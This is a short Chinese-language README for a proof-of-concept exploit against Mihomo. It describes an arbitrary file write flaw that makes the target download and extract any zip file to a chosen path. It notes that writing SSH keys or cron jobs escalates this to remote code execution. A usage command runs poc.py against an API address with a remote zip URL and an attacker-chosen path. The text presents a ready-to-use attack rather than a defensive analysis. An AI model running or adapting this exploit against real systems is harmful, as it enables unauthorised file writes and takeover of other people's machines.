# PoC-mihomo-file-write

Mihomo任意文件写，可通过写SSH密钥、cron任务等实现RCE

## 介绍

Mihomo有一个任意文件写的漏洞，可以让目标从网上下载解压任意zip文件，实现任意文件写入。

## 使用

```shell
python poc.py 'http://127.0.0.1:9090' '/tmp/any-path-you-want/:https://gith
ub.com/PuddinCat/testfiles/archive/refs/heads/main.zip'
```
